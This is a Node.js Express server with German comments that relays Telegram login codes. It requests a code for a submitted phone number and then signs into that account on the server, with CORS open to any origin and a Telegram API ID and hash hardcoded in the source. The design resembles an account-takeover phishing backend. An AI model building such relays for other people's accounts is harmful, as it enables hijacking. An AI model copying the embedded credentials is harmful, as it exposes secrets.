const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
// Port von Render dynamisch abgreifen
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

// Globale Map für Sitzungen
const activeSessions = new Map();

app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        console.log("Anfrage erhalten für:", phone);

        if (!phone || !phone.startsWith('+')) {
            return res.status(400).json({ error: "Nummer muss mit + beginnen (z.B. +49...)" });
        }

        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();

        const result = await client.sendCode({ apiId, apiHash }, phone);
        
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        
        console.log("Code gesendet, Hash:", result.phoneCodeHash);
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) {
        console.error("Telegram Fehler:", e); // Hier siehst du in Render Logs, warum es 400 ist
        res.status(400).json({ error: e.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash } = req.body;
        const session = activeSessions.get(phone);
        
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        await session.client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        res.json({ success: true });
        activeSessions.delete(phone);
    } catch (e) {
        console.error("Verify Fehler:", e);
        res.status(400).json({ error: e.message });
    }
});

app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
